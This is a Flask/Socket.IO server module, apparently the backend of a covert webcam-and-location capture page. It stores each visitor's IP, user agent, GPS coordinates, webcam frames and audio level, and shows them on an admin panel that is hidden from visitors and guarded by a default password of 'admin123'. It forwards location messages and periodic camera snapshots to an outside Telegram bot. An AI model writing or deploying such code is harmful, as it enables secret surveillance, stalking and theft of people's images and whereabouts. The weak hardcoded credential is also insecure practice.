from flask import Blueprint, render_template, request, session, redirect, url_for
from flask_socketio import emit
import os
import base64
import requests
from main import socketio

bp = Blueprint('random', __name__, url_prefix='/random')   # 🔥 নাম বদলে 'random'

ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')
BOT_TOKEN = os.environ.get('BOT_TOKEN')      # optional
CHAT_ID = os.environ.get('CHAT_ID')

clients = {}
viewers = set()
admin_sids = set()

def send_telegram(text, photo_bytes=None):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        if photo_bytes:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo_bytes}, timeout=5)
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'HTML'}, timeout=5)
    except:
        pass

@bp.route('/')
def index():
    """User page – no admin link"""
    return render_template('random_index.html')

@bp.route('/admin')
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('random.admin_login'))
    return render_template('random_admin.html')

@bp.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('random.admin'))
        return render_template('random_admin_login.html', error='Wrong password')
    return render_template('random_admin_login.html')

@bp.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('random.admin'))

# ========== Socket.IO ==========
@socketio.on('connect')
def handle_connect():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent')
    clients[request.sid] = {
        'id': ip,
        'ip': ip,
        'user_agent': ua,
        'location': None,
        'last_frame': None,
        'audio_level': 0
    }
    if session.get('admin_logged_in'):
        admin_sids.add(request.sid)
        emit('admin_update', clients, to=request.sid)

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in clients:
        del clients[request.sid]
    if request.sid in viewers:
        viewers.remove(request.sid)
    if request.sid in admin_sids:
        admin_sids.remove(request.sid)
    emit_clients_except_self()
    if admin_sids:
        emit('admin_update', clients, to=list(admin_sids))

@socketio.on('ready')
def handle_ready():
    if request.sid in clients:
        viewers.add(request.sid)
        user = clients[request.sid]
        send_telegram(f"✅ <b>{user['ip']}</b> connected")
        emit_clients_except_self(to=request.sid)
        for v in viewers:
            if v != request.sid:
                emit_clients_except_self(to=v)
        if admin_sids:
            emit('admin_update', clients, to=list(admin_sids))

@socketio.on('location_update')
def handle_location(data):
    if request.sid in clients:
        clients[request.sid]['location'] = data
        user = clients[request.sid]
        send_telegram(f"📍 {user['ip']}\nLat: {data['lat']}\nLng: {data['lng']}")
        emit_clients_except_self()
        if admin_sids:
            emit('admin_update', clients, to=list(admin_sids))

@socketio.on('video_frame')
def handle_video(data):
    if request.sid in clients:
        clients[request.sid]['last_frame'] = data.get('image')
        clients[request.sid]['audio_level'] = data.get('audio_volume', 0)
        user = clients[request.sid]
        vol = data.get('audio_volume', 0)
        if not hasattr(handle_video, 'counter'):
            handle_video.counter = 0
        handle_video.counter += 1
        if handle_video.counter % 5 == 0:
            img_data = data.get('image')
            if img_data:
                img_bytes = base64.b64decode(img_data.split(',')[1])
                send_telegram(f"🎥 {user['ip']}\n🔊 Audio: {vol}%", photo_bytes=img_bytes)
            else:
                send_telegram(f"🎥 {user['ip']}\n🔊 Audio: {vol}%")
        emit_clients_except_self()
        if admin_sids:
            emit('admin_update', clients, to=list(admin_sids))

def emit_clients_except_self(to=None):
    target_list = [to] if to else list(viewers)
    for target in target_list:
        filtered = {sid: data for sid, data in clients.items() if sid != target}
        emit('clients_update', filtered, to=target)
